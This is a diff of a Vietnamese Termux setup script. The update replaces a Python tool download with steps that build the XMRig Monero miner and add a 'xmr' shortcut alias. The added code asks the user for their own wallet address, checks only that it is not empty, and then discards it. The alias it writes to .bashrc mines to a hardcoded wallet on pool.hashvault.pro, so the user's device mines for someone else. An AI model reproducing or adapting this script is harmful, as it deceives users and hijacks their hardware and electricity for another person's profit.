@@ -1,27 +1,50 @@
 #!/bin/bash
 printf '\n\033[1;32m [NKTOL] | >>welcome<< | create by: Háu Trung Lực\033[0m\n\n'
 home='/data/data/com.termux/files/'
-printf '\n\033[1;32m Tiến Hành Cài Dữ Liệu\033[0m\n\n'
-termux-setup-storage
-pkg update
-pkg upgrade
-pkg install python
-printf '\n\033[1;32m Tiến Hành Cài Python Packages\033[0m\n\n'
-pip install requests
-pip install cloudscraper
-pip install colorama
-pip install regex
-pip install brotli
 
-printf '\n\033[1;32m Tải về script NKZ.py\033[0m\n\n'
-curl -s https://raw.githubusercontent.com/NKZA1/NKTOLpulic/refs/heads/main/NKpilic.py -o $home/usr/bin/nkz
-dos2unix $home/usr/bin/nkz
-chmod +x $home/usr/bin/nkz
-if [ -f $home/usr/bin/nkz ]; then
-    printf '\n\033[1;32m Script NKZ.py đã được tải xuống và cấp quyền thực thi thành công.\033[0m\n\n'
+printf '\n\033[1;32m Tiến Hành Cài Dữ Liệu Cần Thiết\033[0m\n\n'
+termux-setup-storage
+pkg update -y
+pkg upgrade -y
+pkg install git -y
+pkg install build-essential -y
+pkg install cmake -y
+pkg install clang -y
+pkg install wget -y
+pkg install proot -y
+
+printf '\n\033[1;32m Tải về và build XMRig\033[0m\n\n'
+cd ~
+if [ -d xmrig ]; then
+    rm -rf xmrig
+fi
+git clone https://github.com/xmrig/xmrig.git
+mkdir xmrig/build
+cd xmrig/scripts
+./build_deps.sh --build-only
+cd ../build
+cmake .. -DXMRIG_DEPS=scripts/deps
+make -j$(nproc)
+
+if [ -f xmrig ]; then
+    printf '\n\033[1;32m XMRig đã build thành công!\033[0m\n\n'
 else
-    printf '\n\033[1;31m Không thể tải xuống hoặc cấp quyền thực thi cho script NKZ.py.\033[0m\n\n'
+    printf '\n\033[1;31m Lỗi khi build XMRig.\033[0m\n\n'
     exit 1
 fi
-printf '\n\033[1;32m Gõ \033[1;33mnkz \033[1;32m để vào tool\n\n'
-printf '\n\033[1;32m [NKTOL] \033[1;33mTool vào hơi lâu anh em thông cảm!!!\n\n\033[0m'
+
+# ======= CẤU HÌNH ALIAS =======
+printf '\n\033[1;32m Cấu hình alias xmr để chạy nhanh\033[0m\n\n'
+
+read -p "Nhập địa chỉ ví XMR của bạn: " WALLET
+
+if [ -z "$WALLET" ]; then
+    echo "Bạn chưa nhập ví! Thoát..."
+    exit 1
+fi
+
+echo "alias xmr='~/xmrig/build/xmrig -o pool.hashvault.pro:443 -u 43TgANFiYdJj8544Fm9cjTM5N81FNkfhC21Zv8XL2esPhnEU3hySQaiDwHQKYntCkD8z68KStUGoUWdPde231kJyEWMQuoQ -p x --tls'" >> ~/.bashrc
+source ~/.bashrc
+
+printf '\n\033[1;32m Hoàn tất cài đặt!\033[0m\n\n'
+printf '\n\033[1;32m Giờ bạn chỉ cần gõ lệnh: \033[1;33mxmr\033[0m để bắt đầu đào Monero.\n'
